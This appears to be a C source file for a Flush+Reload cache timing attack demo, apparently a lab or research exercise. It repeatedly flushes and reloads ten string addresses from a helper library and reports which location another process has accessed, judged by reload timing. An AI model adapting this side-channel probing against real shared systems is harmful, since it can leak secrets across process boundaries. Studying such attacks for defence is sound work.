#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/time.h>
#include <unistd.h>
#include "libcache.h"
#include "probe.h"

int main() {

	unsigned long long result = 0;
	char* addr;
	FILE *attack = fopen("attack.csv", "w");
	int FnR[10] = { 0 };
	//FILE *attack = fopen("Attack.csv", "w");

	int hit = 0;
	int hit0 = 0;
sleep(1);
//Attack Phase
	for (int j = 0; j < 20000; j++) {
		for (int k = 0; k < 10; k++) {

			addr = (char*) address_of_string(k);
			result = reload(addr);
			flush(addr);

			usleep(1000);
			if (j == 0) {

				FnR[k] = result;
				printf("%d  ", FnR[k]);
			}

			if (k != 0 && result <= 120) {

					printf("Location %d is Accessed !!!.....\n", k);
					return 0;

			}

			/*if (k == 0 && result <= 100 && result >= 70) {
				hit0++;
				if (hit == 400) {

					printf("Location 0 is Accessed !!!\n");
					for (int i = 0; i < 10; i++) {
						printf("%d \n ", FnR[i]);
					}
					return 0;

				}

			}*/
			//fprintf(attack, "%d,%d,%lld\n", j + 1, k, result);

		}

	}

	//fclose(attack);

}

